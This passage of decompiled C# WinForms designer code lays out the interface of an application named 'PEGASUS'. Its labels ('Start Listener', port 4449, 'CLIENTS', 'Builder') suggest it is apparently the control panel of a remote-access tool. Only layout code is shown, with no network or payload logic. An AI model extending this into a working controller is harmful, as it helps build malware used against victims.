			label1.BackColor = System.Drawing.Color.Transparent;
			loadForm.SetDecoration(label1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(label1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(label1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(label1, Guna.UI2.AnimatorNS.DecorationType.None);
			label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.Location = new System.Drawing.Point(690, 27);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(90, 19);
			label1.TabIndex = 10;
			label1.Text = "PEGASUS";
			pictureBox1.BackColor = System.Drawing.Color.Transparent;
			loadForm.SetDecoration(pictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(pictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(pictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(pictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(3, 4);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(70, 69);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 9;
			pictureBox1.TabStop = false;
			guna2HtmlToolTip1.SetToolTip(pictureBox1, "Start Listening!");
			pictureBox1.Click += new System.EventHandler(pictureBox1_Click);
			statusStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			statusStrip1.BackgroundImage = (System.Drawing.Image)resources.GetObject("statusStrip1.BackgroundImage");
			statusStrip1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			guna2Transition2.SetDecoration(statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
			statusStrip1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
			statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { toolStripStatusLabel3 });
			statusStrip1.Location = new System.Drawing.Point(0, 826);
			statusStrip1.Name = "statusStrip1";
			statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
			statusStrip1.Size = new System.Drawing.Size(1416, 22);
			statusStrip1.SizingGrip = false;
			statusStrip1.TabIndex = 14;
			statusStrip1.Text = "statusStrip1";
			statusStrip1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			toolStripStatusLabel3.BackColor = System.Drawing.Color.Transparent;
			toolStripStatusLabel3.Name = "toolStripStatusLabel3";
			toolStripStatusLabel3.Size = new System.Drawing.Size(132, 17);
			toolStripStatusLabel3.Text = "toolStripStatusLabel3";
			guna2PictureBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox4.BackColor = System.Drawing.Color.Transparent;
			guna2Transition2.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2PictureBox4.FillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2PictureBox4.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox4.Image");
			guna2PictureBox4.ImageRotate = 0f;
			guna2PictureBox4.Location = new System.Drawing.Point(33, 58);
			guna2PictureBox4.Name = "guna2PictureBox4";
			guna2PictureBox4.ShadowDecoration.Parent = guna2PictureBox4;
			guna2PictureBox4.Size = new System.Drawing.Size(29, 38);
			guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox4.TabIndex = 11;
			guna2PictureBox4.TabStop = false;
			guna2PictureBox4.Click += new System.EventHandler(guna2PictureBox4_Click);
			guna2PictureBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
			guna2Transition2.SetDecoration(guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2PictureBox3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2PictureBox3.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox3.Image");
			guna2PictureBox3.ImageRotate = 0f;
			guna2PictureBox3.Location = new System.Drawing.Point(33, 96);
			guna2PictureBox3.Name = "guna2PictureBox3";
			guna2PictureBox3.ShadowDecoration.Parent = guna2PictureBox3;
			guna2PictureBox3.Size = new System.Drawing.Size(29, 38);
			guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox3.TabIndex = 7;
			guna2PictureBox3.TabStop = false;
			guna2PictureBox3.UseTransparentBackground = true;
			guna2PictureBox3.Click += new System.EventHandler(guna2PictureBox3_Click);
			guna2PictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
			guna2Transition2.SetDecoration(guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2PictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2PictureBox2.FillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2PictureBox2.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox2.Image");
			guna2PictureBox2.ImageRotate = 0f;
			guna2PictureBox2.Location = new System.Drawing.Point(33, 58);
			guna2PictureBox2.Name = "guna2PictureBox2";
			guna2PictureBox2.ShadowDecoration.Parent = guna2PictureBox2;
			guna2PictureBox2.Size = new System.Drawing.Size(29, 38);
			guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox2.TabIndex = 6;
			guna2PictureBox2.TabStop = false;
			guna2PictureBox2.Click += new System.EventHandler(guna2PictureBox2_Click);
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2Transition2.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(33, 20);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 38);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 5;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click_1);
			panel1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panel1.Controls.Add(listView4);
			loadForm.SetDecoration(panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			panel1.Dock = System.Windows.Forms.DockStyle.Fill;
			panel1.Font = new System.Drawing.Font("Electrolize", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			panel1.Location = new System.Drawing.Point(0, 0);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(231, 848);
			panel1.TabIndex = 7;
			panel2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			panel2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			panel2.Location = new System.Drawing.Point(1503, 257);
			panel2.Name = "panel2";
			panel2.Size = new System.Drawing.Size(32, 11);
			panel2.TabIndex = 8;
			panel2.Visible = false;
			panel3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			panel3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			loadForm.SetDecoration(panel3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(panel3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(panel3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(panel3, Guna.UI2.AnimatorNS.DecorationType.None);
			panel3.Location = new System.Drawing.Point(1503, 500);
			panel3.Name = "panel3";
			panel3.Size = new System.Drawing.Size(32, 11);
			panel3.TabIndex = 9;
			panel3.Visible = false;
			guna2Transition1.AnimationType = Guna.UI2.AnimatorNS.AnimationType.ScaleAndHorizSlide;
			guna2Transition1.Cursor = null;
			animation.AnimateOnlyDifferences = true;
			animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation27.BlindCoeff");
			animation.LeafCoeff = 0f;
			animation.MaxTime = 1f;
			animation.MinTime = 0f;
			animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation27.MosaicCoeff");
			animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation27.MosaicShift");
			animation.MosaicSize = 0;
			animation.Padding = new System.Windows.Forms.Padding(30, 0, 0, 0);
			animation.RotateCoeff = 0f;
			animation.RotateLimit = 0f;
			animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation27.ScaleCoeff");
			animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation27.SlideCoeff");
			animation.TimeCoeff = 0f;
			animation.TransparencyCoeff = 0f;
			guna2Transition1.DefaultAnimation = animation;
			guna2ShadowPanel1.BackColor = System.Drawing.Color.Transparent;
			guna2ShadowPanel1.Controls.Add(panel1);
			loadForm.SetDecoration(guna2ShadowPanel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2ShadowPanel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2ShadowPanel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2ShadowPanel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2ShadowPanel1.Dock = System.Windows.Forms.DockStyle.Right;
			guna2ShadowPanel1.EdgeWidth = 1;
			guna2ShadowPanel1.FillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowPanel1.Location = new System.Drawing.Point(1529, 0);
			guna2ShadowPanel1.Name = "guna2ShadowPanel1";
			guna2ShadowPanel1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowPanel1.Size = new System.Drawing.Size(231, 848);
			guna2ShadowPanel1.TabIndex = 13;
			guna2ShadowPanel1.Visible = false;
			LISTVIEWPANEL0.BackColor = System.Drawing.Color.Transparent;
			LISTVIEWPANEL0.Controls.Add(LISTVIEWSPANEL1);
			LISTVIEWPANEL0.Controls.Add(guna2Panel1);
			loadForm.SetDecoration(LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
			LISTVIEWPANEL0.Dock = System.Windows.Forms.DockStyle.Left;
			LISTVIEWPANEL0.EdgeWidth = 1;
			LISTVIEWPANEL0.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			LISTVIEWPANEL0.Location = new System.Drawing.Point(0, 0);
			LISTVIEWPANEL0.Name = "LISTVIEWPANEL0";
			LISTVIEWPANEL0.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			LISTVIEWPANEL0.ShadowDepth = 200;
			LISTVIEWPANEL0.Size = new System.Drawing.Size(1510, 848);
			LISTVIEWPANEL0.TabIndex = 13;
			LISTVIEWPANEL0.Visible = false;
			guna2Panel1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Panel1.BackgroundImage");
			guna2Panel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			guna2Panel1.Controls.Add(guna2VSeparator2);
			guna2Panel1.Controls.Add(guna2VSeparator1);
			guna2Panel1.Controls.Add(guna2Panel2);
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Controls.Add(guna2Shapes4);
			guna2Panel1.Controls.Add(guna2Shapes3);
			guna2Panel1.Controls.Add(guna2PictureBox3);
			guna2Panel1.Controls.Add(guna2Shapes2);
			guna2Panel1.Controls.Add(guna2Shapes1);
			guna2Panel1.Controls.Add(guna2Shapes5);
			guna2Panel1.Controls.Add(guna2PictureBox4);
			guna2Panel1.Controls.Add(guna2PictureBox2);
			loadForm.SetDecoration(guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Right;
			guna2Panel1.Location = new System.Drawing.Point(1416, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(94, 848);
			guna2Panel1.TabIndex = 7;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2VSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2VSeparator2.BackColor = System.Drawing.Color.Transparent;
			loadForm.SetDecoration(guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2VSeparator2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2VSeparator2.FillColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2VSeparator2.Location = new System.Drawing.Point(88, 0);
			guna2VSeparator2.Name = "guna2VSeparator2";
			guna2VSeparator2.Size = new System.Drawing.Size(10, 845);
			guna2VSeparator2.TabIndex = 18;
			guna2VSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			guna2VSeparator1.BackColor = System.Drawing.Color.Transparent;
			loadForm.SetDecoration(guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2VSeparator1.FillColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2VSeparator1.Location = new System.Drawing.Point(-5, 76);
			guna2VSeparator1.Name = "guna2VSeparator1";
			guna2VSeparator1.Size = new System.Drawing.Size(10, 770);
			guna2VSeparator1.TabIndex = 17;
			guna2Panel2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2Panel2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2Panel2.Controls.Add(guna2NumericUpDown1);
			guna2Panel2.Controls.Add(guna2GradientButton1);
			guna2Panel2.Controls.Add(guna2GradientButton2);
			loadForm.SetDecoration(guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Panel2.Font = new System.Drawing.Font("Electrolize", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2Panel2.Location = new System.Drawing.Point(14, 594);
			guna2Panel2.Name = "guna2Panel2";
			guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Panel2.ShadowDecoration.Enabled = true;
			guna2Panel2.ShadowDecoration.Parent = guna2Panel2;
			guna2Panel2.Size = new System.Drawing.Size(67, 93);
			guna2Panel2.TabIndex = 10;
			guna2Panel2.Visible = false;
			guna2NumericUpDown1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2NumericUpDown1.BackColor = System.Drawing.Color.Transparent;
			guna2NumericUpDown1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2NumericUpDown1.Cursor = System.Windows.Forms.Cursors.IBeam;
			guna2Transition2.SetDecoration(guna2NumericUpDown1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2NumericUpDown1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2NumericUpDown1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2NumericUpDown1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2NumericUpDown1.DisabledState.Parent = guna2NumericUpDown1;
			guna2NumericUpDown1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2NumericUpDown1.FocusedState.Parent = guna2NumericUpDown1;
			guna2NumericUpDown1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2NumericUpDown1.ForeColor = System.Drawing.Color.LightGray;
			guna2NumericUpDown1.Location = new System.Drawing.Point(5, 55);
			guna2NumericUpDown1.Maximum = new decimal(new int[4] { 999999, 0, 0, 0 });
			guna2NumericUpDown1.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
			guna2NumericUpDown1.Name = "guna2NumericUpDown1";
			guna2NumericUpDown1.ShadowDecoration.Parent = guna2NumericUpDown1;
			guna2NumericUpDown1.Size = new System.Drawing.Size(58, 27);
			guna2NumericUpDown1.TabIndex = 142;
			guna2NumericUpDown1.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2NumericUpDown1.Value = new decimal(new int[4] { 4449, 0, 0, 0 });
			guna2GradientButton1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton1.BorderThickness = 1;
			guna2GradientButton1.CheckedState.Parent = guna2GradientButton1;
			guna2GradientButton1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton1.CustomImages.Parent = guna2GradientButton1;
			guna2Transition2.SetDecoration(guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton1.DisabledState.Parent = guna2GradientButton1;
			guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton1.ForeColor = System.Drawing.Color.White;
			guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton1.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton1.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton1.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton1.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton1.HoverState.Parent = guna2GradientButton1;
			guna2GradientButton1.Location = new System.Drawing.Point(5, 28);
			guna2GradientButton1.Name = "guna2GradientButton1";
			guna2GradientButton1.ShadowDecoration.Parent = guna2GradientButton1;
			guna2GradientButton1.Size = new System.Drawing.Size(58, 27);
			guna2GradientButton1.TabIndex = 141;
			guna2GradientButton1.Text = "Stop Listening";
			guna2GradientButton2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton2.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton2.BorderThickness = 1;
			guna2GradientButton2.CheckedState.Parent = guna2GradientButton2;
			guna2GradientButton2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton2.CustomImages.Parent = guna2GradientButton2;
			guna2Transition2.SetDecoration(guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton2.DisabledState.Parent = guna2GradientButton2;
			guna2GradientButton2.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton2.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton2.ForeColor = System.Drawing.Color.White;
			guna2GradientButton2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton2.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton2.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton2.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton2.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton2.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton2.HoverState.Parent = guna2GradientButton2;
			guna2GradientButton2.Location = new System.Drawing.Point(5, 1);
			guna2GradientButton2.Name = "guna2GradientButton2";
			guna2GradientButton2.ShadowDecoration.Parent = guna2GradientButton2;
			guna2GradientButton2.Size = new System.Drawing.Size(58, 27);
			guna2GradientButton2.TabIndex = 140;
			guna2GradientButton2.Text = "Start Listener";
			guna2Shapes4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2Shapes4.BackColor = System.Drawing.Color.Transparent;
			guna2Shapes4.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Shapes4.BackgroundImage");
			guna2Shapes4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			guna2Shapes4.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Shapes4.BorderThickness = 1;
			loadForm.SetDecoration(guna2Shapes4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Shapes4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Shapes4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Shapes4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Shapes4.FillColor = System.Drawing.Color.Transparent;
			guna2Shapes4.Location = new System.Drawing.Point(21, 457);
			guna2Shapes4.Name = "guna2Shapes4";
			guna2Shapes4.PolygonSides = 6;
			guna2Shapes4.PolygonSkip = 1;
			guna2Shapes4.Rotate = 0f;
			guna2Shapes4.Size = new System.Drawing.Size(53, 68);
			guna2Shapes4.TabIndex = 16;
			guna2Shapes4.Text = "CLIENTS";
			guna2HtmlToolTip1.SetToolTip(guna2Shapes4, "Listener!");
			guna2Shapes4.Zoom = 80;
			guna2Shapes4.Click += new System.EventHandler(guna2Shapes4_Click);
			guna2Shapes3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2Shapes3.BackColor = System.Drawing.Color.Transparent;
			guna2Shapes3.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Shapes3.BackgroundImage");
			guna2Shapes3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			guna2Shapes3.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Shapes3.BorderThickness = 1;
			loadForm.SetDecoration(guna2Shapes3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Shapes3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Shapes3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Shapes3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Shapes3.FillColor = System.Drawing.Color.Transparent;
			guna2Shapes3.Location = new System.Drawing.Point(21, 321);
			guna2Shapes3.Name = "guna2Shapes3";
			guna2Shapes3.PolygonSides = 6;
			guna2Shapes3.PolygonSkip = 1;
			guna2Shapes3.Rotate = 0f;
			guna2Shapes3.Size = new System.Drawing.Size(53, 68);
			guna2Shapes3.TabIndex = 12;
			guna2Shapes3.Text = "CLIENTS";
			guna2HtmlToolTip1.SetToolTip(guna2Shapes3, "Builder");
			guna2Shapes3.Zoom = 80;
			guna2Shapes3.Click += new System.EventHandler(builderToolStripMenuItem1_Click_1);
			guna2Shapes2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2Shapes2.BackColor = System.Drawing.Color.Transparent;
			guna2Shapes2.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Shapes2.BackgroundImage");
			guna2Shapes2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			guna2Shapes2.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Shapes2.BorderThickness = 1;
			loadForm.SetDecoration(guna2Shapes2, Guna.UI2.AnimatorNS.DecorationType.None);
